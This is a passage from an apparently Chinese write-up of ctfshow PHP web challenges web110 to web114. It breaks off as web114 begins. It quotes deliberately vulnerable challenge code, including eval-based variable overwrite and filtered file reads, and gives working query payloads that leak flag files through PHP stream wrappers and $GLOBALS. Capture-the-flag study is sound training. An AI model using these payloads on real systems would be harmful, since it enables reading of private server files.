class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$dir</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">DirectoryIterator</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">dirname</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">));</span></span>
<span class="line"><span style="color:#d4d4d4">	</span><span style="color:#c586c0">foreach</span><span style="color:#d4d4d4"> (</span><span style="color:#9cdcfe">$dir</span><span style="color:#d4d4d4"> as </span><span style="color:#9cdcfe">$fileinfo</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">    	</span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$fileinfo</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt; </span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#6a9955">//这里_FILE_是可以写点'.'和绝对路径的，但是这题都过滤了</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">以上例程的输出类似于：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">.</span></span>
<span class="line"><span style="color:#d4d4d4">..</span></span>
<span class="line"><span style="color:#d4d4d4">apple</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">jpg</span></span>
<span class="line"><span style="color:#d4d4d4">banana</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">jpg</span></span>
<span class="line"><span style="color:#d4d4d4">index</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">pear</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">jpg</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">这里就又要考虑怎么获取目录路径，只能找一个方法，如：**getcwd**</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">**Example #1 \**getcwd()\** 例子**</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">// current directory</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">getcwd</span><span style="color:#d4d4d4">() </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\n</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">chdir</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'cvs'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">// current directory</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">getcwd</span><span style="color:#d4d4d4">() </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\n</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">?&gt; </span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">以上例程的输出类似于：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">/home/didou</span></span>
<span class="line"><span style="color:#d4d4d4">/home/didou/cvs</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">到这里本以为能有结果了，但是情况还是不对。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">payload：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">?v1=DirectoryIterator</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">v2=getcwd</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">echo触发之后只返回了一个当前目录的最顶层文件：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">![image-20221117211200605](https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222153581.png)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">这里的..是上级目录的意思，又死路了。我还是很疑惑为什么，后来仔细去看了这个类的toString的解释：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">**Get the file name of the current DirectoryIterator item.** </span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">应该就是返回最顶层文件的意思……</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">看官方解，后来是用了他的继承类，也就是一开始的FilesystemIterator迭代器：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">?v1=FilesystemIterator</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">v2=getcwd</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">![image-20221117211923216](https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222153143.png)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">得到flag文件。但是这里有个问题，因为这里的文件排序是按首字母排序的，所以我们能凑巧得到这个flag，但是下一次狗出题人放一个空文件名字为a呢？能力有限，只能保留疑问了。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">flag：ctfshow{d32cd216-fbde-</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">d30-a11f-</span><span style="color:#b5cea8">08</span><span style="color:#d4d4d4">a92d3f33c4}</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">### web111	(全局变量+变量覆盖)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: h1xa</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">getFlag</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">&amp;</span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">,</span><span style="color:#569cd6">&amp;</span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"$</span><span style="color:#9cdcfe">$v1</span><span style="color:#ce9178"> = &amp;$</span><span style="color:#9cdcfe">$v2</span><span style="color:#ce9178">;"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">var_dump</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$$v1</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">]) &amp;&amp; </span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/</span><span style="color:#d7ba7d">\~</span><span style="color:#d16969">| |</span><span style="color:#d7ba7d">\`</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\!</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\@</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\#</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\\$</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\%</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\^</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\&amp;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\*</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\(</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\)</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\_</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\-</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\+</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\=</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\{</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\[</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\:</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\"</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\'</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\,</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\.</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\?</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\\\\</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\/</span><span style="color:#d16969">|[0-9]|</span><span style="color:#d7ba7d">\&lt;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\&gt;</span><span style="color:#d16969">/'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"error v1"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/</span><span style="color:#d7ba7d">\~</span><span style="color:#d16969">| |</span><span style="color:#d7ba7d">\`</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\!</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\@</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\#</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\\$</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\%</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\^</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\&amp;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\*</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\(</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\)</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\_</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\-</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\+</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\=</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\{</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\[</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\:</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\"</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\'</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\,</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\.</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\?</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\\\\</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\/</span><span style="color:#d16969">|[0-9]|</span><span style="color:#d7ba7d">\&lt;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\&gt;</span><span style="color:#d16969">/'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"error v2"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/ctfshow/'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">getFlag</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">审查代码，</span><span style="color:#9cdcfe">$v1肯定是工具参数，用来给我们得到flag的，我们要考虑的是$v2怎么构造。再看双</span><span style="color:#ce9178">$</span><span style="color:#9cdcfe">$，肯定又是变量覆盖了，也就是说我们要用$v1经过覆盖来var_dump，尝试：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">?v1=ctfshow</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">v2=flag</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">![image-20221117214101776](https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222153726.png)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">这里可能是flag这个变量不能被访问到，是一个变量作用域的问题。可以尝试用全局变量[</span><span style="color:#9cdcfe">$GLOBALS</span><span style="color:#ce9178">](https://www.php.net/manual/zh/reserved.variables.globals.php)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">&gt; </span><span style="color:#9cdcfe">$GLOBALS</span><span style="color:#ce9178"> — 引用全局作用域中可用的全部变量</span></span>
<span class="line"><span style="color:#ce9178">&gt;</span></span>
<span class="line"><span style="color:#ce9178">&gt; **注意**: **变量可用性**</span></span>
<span class="line"><span style="color:#ce9178">&gt;</span></span>
<span class="line"><span style="color:#ce9178">&gt; 与所有其他[超全局变量](https://www.php.net/manual/zh/language.variables.superglobals.php)不同，</span><span style="color:#9cdcfe">$GLOBALS</span><span style="color:#ce9178">在PHP中总是可用的。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">payload：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">?v1=ctfshow</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">v2=GLOBALS</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">![image-20221117214447163](https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222154938.png)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">这里有嵌套输出，可能是文件里面本身脚本是这样写的。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">### web112	(filter读取)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: Firebasky</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">filter</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/</span><span style="color:#d7ba7d">\.\.\/</span><span style="color:#d16969">|http|https|data|input|rot13|base64|string/i'</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"hacker!"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(! </span><span style="color:#dcdcaa">is_file</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">filter</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">));</span></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"hacker!"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">function名字已经提示方法了，很简单了</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">这里要注意的就是这个is_file函数。自php5起开始支持伪协议封装。本地测试可以知道，伪协议是能让返回值为false的，也就是说包装器伪协议能过这个函数。但是不影响file_get_contents和highlight_file</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">payload：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">?file=php:</span><span style="color:#6a9955">//filter/read/resource=flag.php</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">flag：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">ctfshow{f3d7d20f-c91e-</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">ada-a334-</span><span style="color:#b5cea8">79</span><span style="color:#d4d4d4">cb75f08673}</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">### web113	(zlib读取)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: Firebasky</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">filter</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/filter|</span><span style="color:#d7ba7d">\.\.\/</span><span style="color:#d16969">|http|https|data|data|rot13|base64|string/i'</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'hacker!'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(! </span><span style="color:#dcdcaa">is_file</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">filter</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">));</span></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"hacker!"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">这里把filter给禁了，只能查找别的可用伪协议：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">![image-20221118173808186](https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222154166.png)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">测试之后发现zlib应该是可行的，按照官方文档的例子payload可以这样写：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">?file=compress</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">zlib:</span><span style="color:#6a9955">//flag.php</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">得到flag：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">ctfshow{f2d577e1-</span><span style="color:#b5cea8">7198</span><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">b27-</span><span style="color:#b5cea8">9082</span><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">ca635f9e067}</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">这里提示是一个目录溢出，是一个扩展的用法。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">### web114	(filter被放出)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: Firebasky</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
